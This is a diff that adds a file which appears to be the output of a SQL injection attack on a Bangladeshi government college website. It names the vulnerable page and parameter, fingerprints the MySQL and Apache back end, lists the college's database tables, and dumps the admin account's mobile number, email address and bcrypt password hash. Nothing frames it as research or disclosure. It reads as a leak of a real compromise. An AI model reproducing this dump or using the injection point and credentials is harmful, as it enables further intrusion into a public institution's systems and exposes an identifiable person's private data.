@@ -1,0 +1,45 @@
+.gov government
+
+.bd Bangladesh
+
+Rangamati Govt. College
+
+http://rangamaticollege.gov.bd/page.php?id=65
+
+the back-end DBMS is MySQL
+web application technology: Apache
+the back-end DBMS: MySQL >= 5.0.0
+
+available databases [1]:
+[+] rangamat_ion
+
+Database: rangamat_ion
+[17 tables]
++--------------------------+
+| contact                  |
+| department               |
+| external_link            |
+| library                  |
+| menu                     |
+| page                     |
+| photo_album              |
+| photos                   |
+| scroller                 |
+| site                     |
+| slider                   |
+| students                 |
+| students_attendance      |
+| tbl_admin                |
+| teacher_staff            |
+| teacher_staff_attendance |
+| videos                   |
++--------------------------+
+
+Database: rangamat_ion
+Table: tbl_admin
+[1 entry]
++----------+------------+--------------------+--------------------------------------------------------------+
+| fullname | mobile     | email              | password                                                     |
++----------+------------+--------------------+--------------------------------------------------------------+
+| Admin    | 1710676814 | rgcchtbd@yahoo.com | $2y$10$8v0EMKtUzYlHjcTroej2b.gZwePx6tVN7Mop07mAkSl3Mrud0hxFW |
++----------+------------+--------------------+--------------------------------------------------------------+
